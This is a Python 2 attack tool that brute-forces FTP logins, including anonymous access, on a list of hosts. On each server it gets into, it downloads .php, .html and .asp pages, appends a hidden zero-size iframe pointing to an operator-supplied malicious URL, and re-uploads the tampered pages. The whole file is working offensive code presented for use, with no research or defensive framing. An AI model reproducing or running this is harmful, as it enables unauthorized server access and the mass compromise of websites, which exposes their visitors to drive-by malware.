#!/usr/bin/env python2
import argparse, ftplib, sys, threading


class k985ytv():
    def __init__(s):
        s.ips = []
        s.users = []
        s.passwds = []
        s.known_good_logins = []
        s.injected = []
        s.threads = []
        s.getargs()
        print("[.] Hosts: %d (threads)\n[.] Users: %d * Passwords: %d * Timeout: %d\n[.] Max_runtime: %d seconds\n" % (len(s.ips), len(s.users), len(s.passwds), s.timeout, (len(s.users) * len(s.passwds) * s.timeout)))
        s.acquire_targets()
        s.acquire_inject_upload()
        s.summary() 


    def ret_login(s, h,u,p):
        try:
            ftp = ftplib.FTP(h)
            ftp.login(u,p)
            return ftp
        except Exception, e:
            print(str(e))


    def anonlogin(s, h, u, p):
        try:
            f = ftplib.FTP(h)
            f.login(u, p)
            print("[+] Anonymous Login accepted: %s:%s:%s" % (h,u,p))
            s.known_good_logins.append("%s:%s:%s" % (h,u,p))
            f.quit()
        except Exception, e:
            # print("[-] Login failed: %s:%s:%s" % (h,u,p))
            # print(str(e))
            pass


    def brute(s,h):
        for u in s.users:
            print("[.] Trying to brute: %s:%s" % (h, u))
            found=0
            for p in s.passwds:
                if found == 0:
                    try:
                        ftp = ftplib.FTP(h, timeout=int(s.timeout))
                        ftp.login(u,p)
                        print("[+] Login success:  %s:%s:%s" % (h,u,p))
                        s.known_good_logins.append("%s:%s:%s" % (h,u,p))
                        ftp.quit()
                        found=1
                    except Exception, e:
                        if str(e) == "timed out":
                            print("[-] %s:%s:%s : timed out" % (h,u,p))
                        elif str(e).find("Connection refused") != -1:
                            print("[-] %s : Connection refused" % (h))
                            sys.exit() #thread.quit()
                        elif str(e).find("No route to host") != -1:
                            print("[-] %s : No route to host" % (h))
                            sys.exit() #thread.quit()
                        elif str(e).find("Login authentication failed") != -1:
                            # print("[-] %s:%s:%s : Auth failed" % (h,u,p))
                            pass
                        else:
                            print(str(e))
        return


    def searchDefault(s, ftp, h, u, p):
        try:
            dirlist = ftp.nlst()
        except:
            print("[-] No NLST or unable: %s:%s:%s")
            return
        retlist=[]
        # print("[!] Files found: %s" % dirlist)
        for f in dirlist:
            fn = f.lower()
            filetypes=['.php', '.html', '.asp']
            for item in filetypes:
                if item in fn:
                    print("[+] Found: %s:%s:%s:%s" % (h,u,p,fn))
                    retlist.append(f)
        return retlist


    def inj3ct0r(s, ftpobj, dirlist, h,u,p):
        for in_page in dirlist:
            try:
                f = open("/tmp/" +in_page+ '.tmp', 'w')
                ftpobj.retrlines('RETR ' +in_page, f.write)
                print("[+] Downloaded page: %s:%s:%s:%s" % (h,u,p,in_page))
                f.write(s.inject)
                f.close()
                print("[+] Injected malicious Iframe into temp page %s" % in_page)
                ftpobj.storlines("STOR " +in_page,  open("/tmp/" +in_page+ ".tmp", 'r'))
                print("[+] Re-upped modified page: %s:%s:%s:%s" % (h,u,p,in_page))
                s.injected.append("%s:%s:%s:%s" % (h,u,p,in_page))
            except Exception, e:
                print(str(e))


    def acquire_targets(s):
        print("[.] Acquiring targets...")
        for h in s.ips:
            try:
                s.anonlogin(h, "Anonymous", "whazu@yokokoko.de")
            except:
                pass
            s.threads.append(threading.Thread(target=s.brute, args=(h,)))
        for thread in s.threads:
            thread.start()
            thread.join()


    def acquire_inject_upload(s):
        print("\n[.] Identifying in-scope files...")
        for candidate in s.known_good_logins:
            target_files=[]
            try:
                h, u, p = candidate.split(":")
                f = s.ret_login(h,u,p)
                target_files = s.searchDefault(f,h,u,p)
                print("\n[.] Aquiring files, contaminating, re-uploading...")
                if target_files:
                    s.inj3ct0r(f,target_files,h,u,p)
            except Exception, e:
                print(str(e))


    def summary(s):
        if s.injected:
            print("\n\n[#] Summary [#]")
            for i in s.injected:
                print("[!] Injected: %s" % i)


    def listparse(s, e, f):
        tmp = []
        x = open(f, 'r')
        for item in x:
            tmp.append(item.strip('\n'))
        for item in tmp:
            if not item == '' and not item == " " and not item.find(" ") != -1:
                e.append(item)


    def getargs(s):
        ap = argparse.ArgumentParser(description=("FTP k985ytv attack. Includes:\n"
                " 1. attempt anon FTP login."
                " 2. attempt dictionary bruteforce."
                " 3. attempt NLST file listing against working logins."
                " 4. attempt download, Iframe inject, re-upload, all .html .php .asp."
                ))
        ap.add_argument('-i', '--ip', type=str, default=None, help="single IP")
        ap.add_argument('-I', '--ips', type=str, default=None, help="list of IPs")
        ap.add_argument('-u', '--user', type=str, default=None, help="single user")
        ap.add_argument('-U', '--users', type=str, default=None, help="list of users")
        ap.add_argument('-p', '--passwd', type=str, default=None, help="single password")
        ap.add_argument('-P', '--passwds', type=str, default=None, help="list of passwords")
        ap.add_argument('-t', '--timeout', type=int, default=10, help="connection timeout")
        ap.add_argument('-m', '--mal', type=str, default=None, help="malicious URL to inject via Iframe in found web pages")
        args, l = ap.parse_known_args()
        if (args.ip == None and args.ips == None) or (args.user == None and args.users == None) or (args.passwd == None and args.passwds == None):
            ap.print_help()
            sys.exit()
        else:
            if not args.ip == None:
                s.ips.append(args.ip.strip('\n'))
            if not args.passwd == None:
                s.passwds.append(args.passwd.strip("\n"))
            if not args.user == None:
                s.users.append(args.user.strip("\n"))
            if not args.ips == None:
                s.listparse(s.ips, args.ips)
            if not args.users == None:
                s.listparse(s.users, args.users)
            if not args.passwds == None:
                s.listparse(s.passwds, args.passwds)
            s.timeout = args.timeout
            inject=""
            if not args.mal == None:
                inject = args.mal
            else:
                while not inject.find("http") != -1:
                    inject = raw_input("No malicious URL found...  give:\n> ")
            s.inject = '<Iframe width="0" height="0" source="' +inject+ '"></Iframe>'


def main():
    attack = k985ytv()


if __name__=="__main__":
    main()


